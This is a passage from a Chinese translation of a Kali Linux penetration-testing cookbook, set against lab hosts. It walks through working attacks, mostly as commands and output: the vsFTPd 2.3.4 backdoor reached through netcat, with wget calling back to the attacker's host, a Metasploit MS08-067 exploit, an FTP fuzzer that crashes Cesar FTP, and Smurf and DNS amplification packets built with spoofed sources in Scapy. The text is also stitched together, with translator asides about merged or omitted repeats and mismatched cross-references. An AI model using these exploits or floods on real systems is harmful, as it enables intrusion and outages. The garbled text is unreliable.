  \nimport socket\n\nprint \"Awaiting connection...\\n\"\n\nhttprecv = socket.socket(socket.AF_INET,\
  \ socket.SOCK_STREAM)\nhttprecv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,\
  \ 1)\nhttprecv.bind((\"0.0.0.0\",8000))\nhttprecv.listen(2)\n(client, ( ip,sock))\
  \ = httprecv.accept()\nprint \"Received connection from : \", ip\n\ndata = client.recv(4096)\n\
  print str(data)\n\nclient.close()\nhttprecv.close()\n```\n\n提供的 Python 脚本使用 `socket`\
  \ 库生成一个监听在所有本地接口 `TCP` 端口 `8000` 的 Web 服务器。在接收到来自客户端的连接后，脚本将返回客户端的 IP 地址和发送的请求。要使用此脚本验证漏洞，我们需要执行代码导致远程系统与托管的\
  \ Web 服务交互。但在执行此操作之前，我们需要使用以下命令启动脚本：\n\n`root@KaliLinux:~# ./httprecv.py`\n\n`Awaiting\
  \ connection...`\n\n接下来，我们需要利用一个可以产生远程代码执行的漏洞。通过查看 `Metasploitable2` 盒子的 Nessus\
  \ 扫描结果，我们可以看到运行的 `FTP` 服务有一个后门，可以通过提供带有笑脸符号的用户名来触发。这不是开玩笑……这确实包含在生产环境的 `FTP` 服务中。要尝试利用此漏洞，我们首先按照如下方式使用适当的用户名连接服务：\n\
  \n`root@KaliLinux:~# ftp 172.16.36.135 21`\n\n`Connected to 172.16.36.135.`\n`220\
  \ (vsFTPd 2.3.4)`\n`Name (172.16.36.135:root): Hutch:)`\n`331 Please specify the\
  \ password.`\n`Password:`\n`^C`\n`421 Service not available, remote server has closed\
  \ connection`\n\n在尝试使用包含笑脸的用户名连接后，远程主机的 `TCP` 端口 `6200` 应该打开了一个后门。我们不需要输入密码。相反，可以使用\
  \ `Ctrl` + `C` 退出 `FTP` 客户端，然后可以使用 `Netcat` 连接到打开的后门，如下：\n\n`root@KaliLinux:~# nc\
  \ 172.16.36.135 6200`\n`wget http://172.16.36.224:8000`\n`--04:18:18-- http://172.16.36.224:8000/**`\n\
  `=> ìndex.html'`\n`Connecting to 172.16.36.224:8000... connected.`\n`HTTP request\
  \ sent, awaiting response... No data received.`\n`Retrying.`\n`--04:18:19-- http://172.16.36.224:8000/**`\n\
  `(try: 2) => ìndex.html'`\n`Connecting to 172.16.36.224:8000... failed: Connection\
  \ refused.`\n`^C`\n\n在与打开的端口建立 `TCP` 连接后，我们可以使用脚本来验证是否可以执行远程代码执行。为了这一点，我们尝试使用 `wget`\
  \  HTTP 检测服务器的 URL。在尝试执行此代码后，我们可以通过查看脚本输出来验证是否收 HTTP 请求：\n\n`root@KaliLinux:~# ./httprecv.py`\n\
  `Received connection from : 172.16.36.135`\n`GET / HTTP/1.0`\n`User-Agent: Wget/1.10.2`\n\
  `Accept: */*`\n`Host: 172.16.36.224:8000`\n`Connection: Keep-Alive`\n\n### 工作原理……\n\
  \n该脚本通过识别来自远程主机的尝试连接来工作。通过执行代码导致远程系统连接回我们监听的服务器，就可以验证利用特定漏洞是否可以远程代码执行。如果远程服务器上没有安装\
  \ `wget` 或 `curl`，则可能需要采用其他方法。\n\n\n\n\n接下来，我们需要利用一个可以实现远程代码执行的漏洞。通过查看 Windows XP\
  \ 盒的 Nessus 扫描结果，我们可以看到系统容易受到 `MS08-067` 漏洞的影响。为了验证这一点，我们将使用一个向扫描系统执行 `ping` 命令的负载\
  \ 来利用该漏洞，具体如下：\n\n```\nmsf > use exploit/windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi)\
  \ > set PAYLOAD windows/exec\nPAYLOAD => windows/exec\nmsf exploit(ms08_067_netapi)\
  \ > set RHOST 172.16.36.225\nRHOST => 172.16.36.225\nmsf exploit(ms08_067_netapi)\
  \ > set CMD cmd /c ping 172.16.36.224 -n 1\nCMD => cmd /c ping 172.16.36.224 -n\
  \ 1\nmsf exploit(ms08_067_netapi) > exploit\n[*] Automatically detecting the target...\n\
  [*] Fingerprint: Windows XP - Service Pack 2 - lang:English\n[*] Selected Target:\
  \ Windows XP SP2 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability...\n\
  ```\n\nMetasploit 中的该利用被配置为使用 `windows/exec` 负载，该负载会在受攻击的系统中执行代码。此负载被配置为向我们的扫描系统发送单个\
  \ ICMP 回显请求。执行后，我们可以通过参考仍在监听的原始脚本来确认利用成功：\n\n```\nroot@KaliLinux:~# ./listener.py\n\
  Listening for Incoming ICMP Traffic. Use Ctrl+C to stop listening\n172.16.36.225\
  \ is exploitable\n```\n\n### 工作原理……\n\n该脚本通过监听来自远程主机的入站 ICMP 流量来工作。通过执行导致远程系统向我们的监听服务器发送回显请求的代码，可以验证通过利用特定漏洞来实现远程代码执行的可行性。\n\
  \n# 拒绝服务\n\n当你在互联网上公开访问资源，甚至在内部网络上对小型社区开放资源时，考虑拒绝服务（DoS）攻击的风险是非常重要的。DoS 攻击可能会非常令人沮丧，而且有时代价高昂。最糟糕的是，这些威胁通常是最难缓解的威胁。为了能够正确评估对你的网络和信息资源的威胁，必须理解存在的\
  \ DoS 威胁类型及其相关的趋势。本章将包含以下评估 DoS 威胁的配方：\n\n- 用于识别缓冲区溢出的 Fuzz 测试\n- 远程 FTP 服务缓冲区溢出\
  \ DoS\n- Smurf DoS 攻击\n- DNS 放大 DoS 攻击\n- SNMP 放大 DoS 攻击\n- NTP 放大 DoS 攻击\n- SYN\
  \ 泛洪 DoS 攻击\n- Sock 压力 DoS 攻击\n- 使用 Nmap NSE 进行 DoS\n- 使用 Metasploit 进行 DoS\n- 使用\
  \ exploit database 进行 DoS \n\n在逐一处理上述每个配方之前，我们应该处理一些底层原理，并理解它们与本章将讨论的 DoS 攻击之间的关系。我们在后续章节中讨论的\
  \ DoS 攻击可以归类为缓冲区溢出、流量放大攻击或资源消耗攻击。我们将按顺序处理与此类攻击工作方式相关的通用原理。\n\n## 拒绝服务\n\n缓冲区溢出是一种编码漏洞，可能导致应用程序、服务或整个底层操作系统的拒绝服务。通常来说，缓冲区溢出能够导致拒绝服务，因为可能导致任意数据被加载到内存的非预期段中。这会破坏执行流并导致服务或操作系统的崩溃。\n\
  \n流量放大 DoS 攻击通过消耗特定服务器、设备或网络的可用网络带宽来产生 DoS 状态。流量放大攻击成功需要两个条件。这些条件如下：\n\n1. **重定向（Redirection）**：攻击者必须能够请求可以重定向到受害者的响应。这通常通过\
  \ IP 伪造来实现。由于 UDP 不是一种面向连接的协议，大多数使用 UDP 作为关联传输层协议的应用层协议都可以通过伪造请求将服务响应重定向到其他主机。\n\
  2. **放大（Amplification）**：重定向的响应必须大于请求该响应的请求。响应字节大小与请求字节大小的比例越大，攻击越成功。\n\n例如，如果发现一个\
  \ UDP 服务生成的响应比其关联请求大 10 倍，攻击者可以利用该服务，通过向漏洞服务以最高可能的传输速率发送伪造请求，可能产生比其他情况下多 10 倍的攻击流量。\n\
  \n资源消耗攻击是指产生一种状态的攻击，即托管服务器或设备的本地资源被消耗到以至于这些资源无法执行其预期的运行功能。这种攻击可以针对各种本地资源，包括内存、处理器性能、磁盘空间或并发网络连接的持续性。\n\
  \n## Fuzz 测试识别缓冲区溢出\n\n识别缓冲区溢出漏洞最有效的技术之一是 Fuzz 测试（模糊测试）。Fuzz 是通过向函数传递构造或随机数据来测试缓冲区溢出漏洞实践。在适当的情况下，输入数据可能会逃离其指定的缓冲区并流入相邻的寄存器或内存段。这一过程将破坏执行流并导致应用程序或系统崩溃。\n\
  \n### 准备工作\n\n要执行 Fuzz 测试，你需要一个运行基于 TCP 或 UDP 网络服务的系统。在提供的示例中，使用一个带有 FTP 服务的 Windows\
  \ XP 系统执行此任务。有关设置 Windows 系统的更多信息，请参考第 1 章中的 `Installing Windows Server` 配方。此外，此部分需要使用\
  \ `VIM` 或 `Nano` 等文本编辑器向文件系统编写脚本。关于编写脚本的更多信息，请参考第 1 章中的 `Using text editors (VIM\
  \ and Nano)` 配方。\n\n### 如何操作……\n\nPython 是一种极佳的脚本语言，可用于有效开发自定义的 Fuzz 工具。在评估 TCP\
  \ 服务时，`socket` 函数在简化执行完整三次握手序列和连接到监听服务端口的过程中非常有用。任何 Fuzz 脚本的首要目标是将数据作为输入发送给任何给定函数并评估结果。我开发了一个可以用于\
  \ Fuzz FTP 服务认证后函数的脚本，如下所示：\n\n```python#!/usr/bin/python\nimport socket\nimport\
  \ sys\n\nif len(sys.argv) != 6:\n    print \"Usage - ./ftp_fuzz.py [Target-IP] [Port\
  \ Number] [Payload] [Interval] [Maximum]\"\n    print \"Example - ./ftp_fuzz.py\
  \ 10.0.0.5 21 A 100 1000\"\n    print \"Example 将使用一系列负载对定义的 FTP 服务进行 Fuzz，包括 100\
  \ 个 'A'、200 个 'A' 等……最多 1000 个\"\n    sys.exit()\n\ntarget = str(sys.argv[1])\n\
  port = int(sys.argv[2])\nchar = str(sys.argv[3])\ni = int(sys.argv[4])\ninterval\
  \ = int(sys.argv[4])\nmax = int(sys.argv[5])\n\nuser = raw_input(str(\"Enter ftp\
  \ username: \"))\npasswd = raw_input(str(\"Enter ftp password: \"))\ncommand = raw_input(str(\"\
  Enter FTP command to fuzz: \"))\n```\n\n\n\n\n# 拒绝服务攻击\n\n```python\nwhile i <=\
  \ max:\n    try:\n        payload = command + \" \" + (char * i)\n        print\
  \ \"Sending \" + str(i) + \" instances of payload (\" + char + \") to target\"\n\
  \        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connect=s.connect((target,port))\n\
  \        s.recv(1024)\n        s.send('USER ' + user + '\\r\\n')\n        s.recv(1024)\n\
  \        s.send('PASS ' + passwd + '\\r\\n')\n        s.recv(1024)\n        s.send(payload\
  \ + '\\r\\n')\n        s.send('QUIT\\r\\n')\n        s.recv(1024)\n        s.close()\n\
  \        i = i + interval\n    except:\n        print \"\\nUnable to send...Server\
  \ may have crashed\"\n        sys.exit()\n    print \"\\nThere is no indication\
  \ that the server has crashed\"\n```\n\n脚本的第一部分定义了 Python 解释器的位置并导入了所需的库。第二部分评估了提供的参数数量，以确保其与脚本的正确用法一致。第三部分定义了在整个执行过程中将使用的变量。其中几个变量的值是从执行脚本时传递给脚本的系统参数获取的。\n\
  \n其余变量通过接受脚本用户的输入来定义。最后，脚本的剩余部分定义了模糊（fuzzing）过程。我们如下所示执行 `ftp_fuzz.py` 文件：\n\n```bash\n\
  root@KaliLinux:~# ./ftp_fuzz.py\nUsage - ./ftp_fuzz.py [Target-IP] [Port Number]\
  \ [Payload] [Interval] [Maximum]\nExample - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000\n\
  示例将使用一系列有效负载对定义的 FTP 服务进行模糊，包括 100 个 'A'、200 个 'A' 等……直到最大 1000 个\nroot@KaliLinux:~#\
  \ ./ftp_fuzz.py 172.16.36.134 21 A 100 1000\nEnter ftp username: anonymous\nEnter\
  \ ftp password: user@mail.com\nEnter FTP command to fuzz: MKD\n```\n\nSending 100\
  \ instances of payload (A) to target\nSending 200 instances of payload (A) to target\n\
  Sending 300 instances of payload (A) to target\nSending 400 instances of payload\
  \ (A) to target\nSending 500 instances of payload (A) to target\nSending 600 instances\
  \ of payload (A) to target\nSending 700 instances of payload (A) to target\nSending\
  \ 800 instances of payload (A) to target\nSending 900 instances of payload (A) to\
  \ target\nSending 1000 instances of payload (A) to target\nThere is no indication\
  \ that the server has crashed\n\n如果在没有提供相应数量系统参数的情况下执行脚本，脚本将返回预期的用法。有几个值必须作为系统参数包含。传递给脚本的第一个参数是目标\
  \ IP 地址。该地址与运行你想要模糊的 FTP 服务的系统关联。下一个参数是 FTP 服务运行的端口号。在大多数情况下，FTP 将在 TCP 端口 `21`\
  \ 上运行。`payload` 将定义要批量传递服务的字符或字符序列。`interval` 参数定义了在第一次迭代中传递给 FTP 服务的定义的有效负载实例数量。该参数也将是每次后续迭代中有效负载实例数量增加的增量，直到达到最大值。该最大值由最后一个参数的值定义。在带有这些系统参数执行脚本后，它将请求\
  \ FTP 服务的身份凭据，并询问应该模糊哪个认证后函数。在提供的示例中，模糊测试是对运行在 IP 地址 `172.16.36.134` 的 Windows XP\
  \ 主机 TCP 端口 `21` 上的 FTP 服务进行的。使用任意电子邮件地址向 FTP 服务传递了匿名登录凭据。此外，将一系列 `As` 传递给 `MKD`\
  \ 认证后函数，从 100 个实例开始，每次增加 100 个，直到达到 1000 个的最大值。该脚本也可以用于在有效负载中传递一系列字符：\n\n```bash\n\
  root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 ABCD 100 500\nEnter ftp username:\
  \ anonymous\nEnter ftp password: user@mail.com\nEnter FTP command to fuzz: MKD\n\
  Sending 100 instances of payload (ABCD) to target\nSending 200 instances of payload\
  \ (ABCD) to target\nSending 300 instances of payload (ABCD) to target\nSending 400\
  \ instances of payload (ABCD) to target\nSending 500 instances of payload (ABCD)\
  \ to target\nThere is no indication that the server has crashed\n```\n\n在提供的示例中，`payload`\
  \ 被定义为 `ABCD`，该有效负载的实例被定义为 100 的倍数，直到值为 500。\n\n### 工作原理……\n\n通常来说，缓冲区溢出会导致拒绝服务，因为它们可能导致任意数据加载到内存的非预期段中。这将中断执行流并导致服务或操作系统的崩溃。本教程中讨论的特定脚本之所以有效，是因为如果服务或操作系统发生崩溃，`socket`\
  \ 将不再接受输入，脚本将无法完成整个有效负载注入序列。如果发生这种情况，则需要使用 `Ctrl` + `C` 强制关闭脚本。在这种情况下，脚本将返回指示，说明无法发送后续的有效负载且服务器可能已经崩溃。\n\
  \n### 远程 FTP 服务缓冲区溢出 DoS\n\n在特定情况下，输入数据可能会逃离其指定的缓冲区并流向相邻的寄存器或内存段。此过程将中断执行流并导致应用程序或系统崩溃。在某些情况下，缓冲区溢出漏洞还可以被用于执行未经授权的代码。\n\
  \n\n\n\n\n```python\ncommand = raw_input(str(\"Enter FTP command to fuzz: \"))\n\
  \nwhile i <= max:\n    try:\n        payload = command + \" \" + ('\\n' * i)\n \
  \       print \"Sending \" + str(i) + \" line break characters to target\"\n   \
  \     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connect=s.connect((target,port))\n\
  \        s.recv(1024)\n        s.send('USER ' + user + '\\r\\n')\n        s.recv(1024)\n\
  \        # Denial of Service\n        s.send('PASS ' + passwd + '\\r\\n')\n    \
  \    s.recv(1024)\n        s.send(payload + '\\r\\n')\n        s.send('QUIT\\r\\\
  n')\n        s.recv(1024)\n        s.close()\n        i = i + interval\n    except:\n\
  \        print \"\\nUnable to send...Server may have crashed\"\n        sys.exit()\n\
  \    print \"\\nThere is no indication that the server has crashed\"\n```\n\n对脚本进行的修改包括修改用法说明，并将负载作为提供的参数移除，然后在脚本中硬编码一个换行符负载以按顺序发送。\n\
  \n`root@KaliLinux:~# ./ftp_fuzz.py`\n\n`Usage - ./ftp_fuzz.py [Target-IP] [Port\
  \ Number] [Interval] [Maximum]`\n\n`Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000`\n\
  \n示例将使用一系列换行符对定义的 FTP 服务进行模糊测试，包括 100 个 `\\n`、200 个 `\\n` 等……直到最大值 1000 个。\n\n`root@KaliLinux:~#\
  \ ./ftp_fuzz.py 172.16.36.134 21 100 1000`\n`Enter ftp username: anonymous`\n`Enter\
  \ ftp password: user@mail.com`\n`Enter FTP command to fuzz: MKD`\n`Sending 100 line\
  \ break characters to target`\n`Sending 200 line break characters to target`\n`Sending\
  \ 300 line break characters to target`\n`Sending 400 line break characters to target`\n\
  `Sending 500 line break characters to target`\n`Sending 600 line break characters\
  \ to target`\n`Sending 700 line break characters to target`\n`^C`\n`Unable to send...Server\
  \ may have crashed`\n\n![](img/index-318_1.jpg)\n\n## 第 6 章\n\n如果执行脚本时没有提供相应的系统参数，脚本将返回预期的用法说明。我们可以执行脚本并发送一系列\
  \ 100 的倍数的负载，最多到 1000 个。在发送了 700 个换行符的负载后，脚本停止发送负载并处于空闲状态。在一段未活动后，强制使用 `Ctrl` +\
  \ `C` 关闭关闭脚本。脚本表明它无法发送字符，且远程服务器可能已经崩溃。请查看下面的截图：\n\n回到运行 Cesar 0.99 FTP 服务的 Windows\
  \ XP 机器，我们可以看到 `server.exe` 应用程序已崩溃。为了在拒绝服务后恢复操作，必须手动重启 Cesar FTP 服务。\n\n### 工作原理……\n\
  \n通常情况下，缓冲区溢出会导致拒绝服务，因为它们会导致任意数据被加载到内存的非预期段中。这可能会破坏执行流并导致服务或操作系统的崩溃。本教程中讨论的特定脚本之所以有效，是因为在服务或操作系统发生崩溃的情况下，`socket`\
  \ 将不再接受输入，脚本将无法完成整个负载序列注入序列。如果发生这种情况，则需要使用 `Ctrl` + `C` 强制关闭脚本。在这种情况下，脚本将返回一个指示，表明无法发送后续负载且服务器可能崩溃。\n\
  \n### Smurf DoS 攻击\n\nSmurf 攻击在历史上是执行分布式拒绝服务（DDoS）放大攻击的最老技术之一。这种攻击由向网络广播地址发送系列带有伪造源\
  \ IP 地址的 ICMP 回显请求组成。当此请求被广播时，局域网上的所有主机都应该对收到的每个伪造请求同时向目标响应。这种技术对现代系统的效果较差，因为大多数系统不对\
  \ IP 指向广播流量做出响应。\n\n### 拒绝服务\n\n### 准备工作\n\n要执行 Smurf 攻击，你需要一个运行有多个系统的局域网（LAN）。在提供的示例中，使用了安装了\
  \ Ubuntu 作为扫描目标。有关设置 Ubuntu 的更多信息，请参阅本书《第 1 章》中《入门》部分的*安装 Ubuntu Server*教程。\n\n\
  ### 如何操作……\n\n要尝试执行传统的 Smurf 攻击，可以使用 `Scapy` 从头构建所需的数据包。要在 Kali Linux 命令行中使用 `Scapy`，请在终端中使用\
  \ `scapy` 命令；如下所示。要向广播地址发送 ICMP 请求，我们必须首先构建该请求的各个层。我们需要构造的第一层是 IP 层：\n\n`root@KaliLinux:~#\
  \ scapy`\n`Welcome to Scapy (2.2.0)`\n`>>> i = IP()`\n`>>> i.display()`\n```\n###\
  \ IP ###\nversion: 4\nihl: None\n###\ntos: 0\nttl: 64\nproto: 6\nlen: None\n```\n\
  （注：提供的文本包含大量重复部分/合并内容。我将根据指令遵循文本逻辑流进行处理。）\n\n构建 IP 层：\n`root@KaliLinux:~# scapy`\n\
  `Welcome to Scapy (2.2.0)`\n`>>> i = IP()`\n`>>> i.display()`\n```\n### IP ###\n\
  version: 4\nihl: None\n###\ntos: 0\nttl: 64\nproto: 6\nlen: None\n```\n（此处省略原文中重复的\
  \ Scapy 示例块）\n\n\n\n\n\n.........................................................................\n\
  \n...........................\n\n**已发送 100 个数据包。**\n\n308\n\n*第 6 章*\n\n在提供的示例中，使用了\
  \ `Scapy` 中的单行命令来执行我们之前讨论过的相同操作，这次源 IP 地址被伪装为局域网（LAN）上另一个系统的地址。此外，计数值可用于顺序发送多个请求。\n\
  \n### 工作原理……\n\n放大攻击通过利用第三方设备（或多个）通过网络流量淹没目标来实现。对于大多数放大攻击，满足以下两个条件：\n\n- 用于执行攻击的协议不验证请求源\n\
  - 所用网络函数的响应应远大于用于请求该响应的请求\n\n传统的 `smurf` 攻击的有效性取决于局域网上的主机对 IP 指向广播流量的响应。此类主机将收到来自目标系统伪造\
  \ IP 地址的广播 `ICMP` 回显请求，并对收到的每个请求同时返回 `ICMP` 回显应。\n\n### DNS 放大 DoS 攻击\n\nDNS（域名系统）`DNS`\
  \ 放大攻击通过对给定域名的所有记录类型进行伪造查询来利用开放的 DNS 解析器。通过采用 `DDoS` 组件同时向多个开放解析器发送请求，可以增加这种攻击的有效性。\n\
  \n### 准备工作\n\n为了模拟 `DNS` 放大攻击，你需要一个本地名称服务器，或者知道开放且可访问的名称服务器的 IP 地址。在提供的示例中，使用了安装了\
  \ `Ubuntu` 的扫描目标。关于设置 `Ubuntu` 的更多信息，请参阅第 1 章*入门指南*中的*安装 Windows Server*配方。\n\n\
  ### 如何操作……\n\n为了理解 `DNS` 放大的工作原理，可以使用 `host`、`dig` 或 `nslookup` 等基础 `DNS` 查询工具。通过对一个已建立域名的所有记录类型发起请求，你会发现某些请求返回了相当庞大的响应：\n\
  \n```\nroot@KaliLinux:~# dig ANY google.com @208.67.220.220\n; <<>> DiG 9.8.4-rpz2+rl005.12-P1\
  \ <<>> ANY google.com @208.67.220.220\n;; global options: +cmd\n;; Got answer:\n\
  ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41539\n;; flags: qr rd ra; QUERY:\
  \ 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 0\n;; QUESTION SECTION:\n;google.com.\
  \ IN ANY\n;; ANSWER SECTION:\ngoogle.com. 181 IN A 74.125.232.101\ngoogle.com. 181\
  \ IN A 74.125.232.97\ngoogle.com. 181 IN A 74.125.232.102\ngoogle.com. 181 IN A\
  \ 74.125.232.99\ngoogle.com. 181 IN A 74.125.232.104\ngoogle.com. 181 IN A 74.125.232.96\n\
  google.com. 181 IN A 74.125.232.100\ngoogle.com. 181 IN A 74.125.232.103\ngoogle.com.\
  \ 181 IN A 74.125.232.105\ngoogle.com. 181 IN A 74.125.232.98\ngoogle.com. 181 IN\
  \ A 74.125.232.110\ngoogle.com. 174 IN AAAA 2607:f8b0:4004:803::1007\ngoogle.com.\
  \ 167024 NS ns2.google.com\ngoogle.com. 167024 NS ns1.google.com\ngoogle.com. 167024\
  \ NS ns3.google.com\ngoogle.com. 167024 NS ns4.google.com\ngoogle.com. 60 IN SOA\
  \ ns1.google.com. dns-admin.google.com. 1545677 7200 1800 129600 300\n;; Query time:\
  \ 7 msec\n;; SERVER: 208.67.220.220#53(208.67.220.220)\n;; WHEN: Thu Dec 19 02:40:13\n\
  ;; MSG SIZE rcvd: 350\n```\n\n在提供的示例中，针对 `google.com` 域名所有记录类型的请求返回的响应包含了 11 条 `A`\
  \ 记录、1 条 `AAAA` 记录、4 条 `NS` 记录和 1 条 `SOA` 记录。（此处省略后续重复的段落翻译）\n\n\n\n\n\n要构建 DNS\
  \ 查询记录，我们将使用与之前处理 IP、UDP 和 DNS 层时相同的技术。在提供的示例中，DNS 查询记录被赋值给变量 `q`。正如之前所讨论的，可以通过调用\
  \ `display()` 函数来识别默认配置。在这里，我们可以看到有几个值需要修改：\n\n`>>> q.qname = 'google.com'`\n\n\
  `>>> q.qtype=255`\n\n`>>> q.display()`\n\n### DNS 查询记录\n\n`qname= 'google.com'`\n\
  \n`qtype= ALL`\n\n`qclass= IN`\n\n`qname` 的值需要被设置为正在查询的域名。此外，需要通过传递整数值 `255` 将 `qtype`\
  \ 设置为 `ALL`。通过再次调用 `display()` 函数，我们可以验证配置调整已经完成。现在查询记录已经配置完毕，应当将查询记录对象赋值给 DNS 的\
  \ `qd` 值：\n\n`>>> d.qd = q`\n\n`>>> d.display()`\n\n### DNS\n\n`id= 0`\n\n`qr= 0`\n\
  \n`opcode= QUERY`\n\n`aa= 0`\n\n`tc= 0`\n\n`rd= 1`\n\n`ra= 0`\n\n`z= 0`\n\n`rcode=\
  \ ok`\n\n`qdcount= 1`\n\n`ancount= 0`\n\n`nscount= 0`\n\n`arcount= 0`\n\n`qd`\n\n\
  | DNS 查询记录 |\n| qname= 'google.com' |\n| qtype= ALL |\n| qclass= IN |\n`an= None`\n\
  \n`ns= None`\n\n`ar= None`\n\n我们可以通过调用 `display()` 函数来验证查询记录已经赋值给 DNS 的 `qd` 值。现在\
  \ IP、UDP 和 DNS 层已经构建完成，并且适当查询记录已分配给 DNS 层，我们可以通过堆叠这些层来构建请求：\n\n`>>> request = (i/u/d)`\n\
  \n`>>> request.display()`\n\n### IP\n\n`version= 4`\n\n`ihl= None`\n\n`tos= 0x0`\n\
  \n`len= None`\n\n`id= 1`\n\n`flags=`\n\n`frag= 0`\n\n`ttl= 64`\n\n`proto= udp`\n\
  \n`chksum= None`\n\n`src= 172.16.36.180`\n\n`dst= 208.67.220.220`\n\n`options`\n\
